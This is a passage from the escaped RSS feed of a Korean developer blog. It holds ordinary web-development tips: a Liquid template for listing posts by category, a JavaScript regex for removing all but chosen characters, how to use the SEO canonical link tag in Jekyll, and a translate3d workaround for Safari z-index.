  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; temp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; split_char &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; name &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

  &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; temp &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;assign&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; categories &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; cat &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; categories &lt;span class=&quot;token keyword&quot;&gt;reversed&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;tag-group&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;capture&lt;/span&gt; cat_name &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; cat &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endcapture&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;#&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; cat_name &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;slugize&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;h5&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;tag-group-title&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; cat_name &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function filter&quot;&gt;slugize&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; cat_name &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;h5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; post &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;categories&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;cat_name&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;article&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;tag-item&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
      &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;a&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;tag-item-title&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; site&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;url &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt; post&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;url &lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{{&lt;/span&gt;post&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;title&lt;span class=&quot;token delimiter punctuation&quot;&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;article&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token liquid language-liquid&quot;&gt;&lt;span class=&quot;token delimiter punctuation&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;token delimiter punctuation&quot;&gt;%}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Regex 특정 문자 제외 필터링]]></title><description><![CDATA[특정 문자를 제외한 문자를 제거하고 싶을때 ^를 사용하면 된다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Thu, 21 Feb 2019 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;특정 문자를 제외한 문자를 제거하고 싶을때 ^를 사용하면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token string&quot;&gt;&apos;basdekrjalskjdblkaweih&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;[^abc]&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// &quot;baaba&quot;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; filter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;abc&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; reg &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;RegExp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;[^&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;filter&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;g&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token string&quot;&gt;&apos;basdekrjalskjdblkaweih&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;reg&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// &quot;baaba&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[SEO canonical]]></title><description><![CDATA[검색엔진 최적화 기법중에 를 사용하여 최적화 하는 방법이 있습니다. 같은 페이지를 보여주지만, 서로 다른 URL…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 20 Feb 2019 16:00:00 GMT</pubDate><content:encoded>&lt;p&gt;검색엔진 최적화 기법중에 &lt;code class=&quot;language-text&quot;&gt;&amp;lt;link rel=&quot;canonical&quot; href=&quot;{site}&quot; /&gt;&lt;/code&gt;를 사용하여 최적화 하는 방법이 있습니다.&lt;/p&gt;
&lt;p&gt;같은 페이지를 보여주지만, 서로 다른 URL을 가질 경우 검색엔진에서 손해를 볼 수 있습니다.&lt;/p&gt;
&lt;p&gt;이를 해결하기 위해 &lt;code class=&quot;language-text&quot;&gt;canonical&lt;/code&gt;를 사용하여 해결할 수 있습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;canonical&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://micalgenus.github.io/index.html&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;위와 같은 페이지가 있다고 한다면, 해당 사이트가 &lt;code class=&quot;language-text&quot;&gt;https://micalgenus.github.io/&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;https://micalgenus.github.io/index.html&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;https://micalgenus.github.io/index&lt;/code&gt;와 같이 서로 다른 URL을 가질 경우 검색엔진은 3페이지를 모두 다른 페이지로 판단하게 됩니다.&lt;/p&gt;
&lt;p&gt;이 때, &lt;strong&gt;canonical&lt;/strong&gt;을 사용하게 되면 검색엔진은 해당 &lt;strong&gt;href&lt;/strong&gt;인 &lt;code class=&quot;language-text&quot;&gt;https://micalgenus.github.io/index.html&lt;/code&gt;페이지로 인식하게 되고, 결국 하나의 페이지로 인식하여 검색엔진에 긍정적인 효과를 가져오게 됩니다.&lt;/p&gt;
&lt;p&gt;제 블로그의 경우 다음과 같이 작성되어, Jekyll가 문서를 생성할 때 해당 옵션을 추가해 주었습니다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;canonical&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;{{ page.url | replace:&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;index.html&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;,&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&apos;&lt;/span&gt; | prepend: site.url }}&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Safari zindex 문제]]></title><description><![CDATA[Safari에서 효과가 적용되지 않을 때가 있다. 검색해보면 오래전부터 있던 버그같은데,  옵션을 사용하여 해결할 수 있다. translate3d(x,y,);에서 z부분을 대신 사용하여 해결한다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 20 Feb 2019 08:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Safari에서 &lt;code class=&quot;language-text&quot;&gt;z-index&lt;/code&gt;효과가 적용되지 않을 때가 있다.&lt;/p&gt;
&lt;p&gt;검색해보면 오래전부터 있던 버그같은데, &lt;code class=&quot;language-text&quot;&gt;-webkit-transform: translate3d(0,0,0);&lt;/code&gt; 옵션을 사용하여 해결할 수 있다.&lt;/p&gt;
&lt;p&gt;translate3d(x,y,&lt;code class=&quot;language-text&quot;&gt;z&lt;/code&gt;);에서 z부분을 &lt;code class=&quot;language-text&quot;&gt;z-index&lt;/code&gt;대신 사용하여 해결한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token style&quot;&gt;&lt;span class=&quot;token language-css&quot;&gt;
  &lt;span class=&quot;token selector&quot;&gt;#under&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;z-index&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;-webkit-transform&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;translate3d&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 0&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 1px&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 50px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 50px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; block&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; red&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token selector&quot;&gt;#upper&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;z-index&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;-webkit-transform&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;translate3d&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 0&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 2px&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; block&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token property&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; blue&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;under&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;
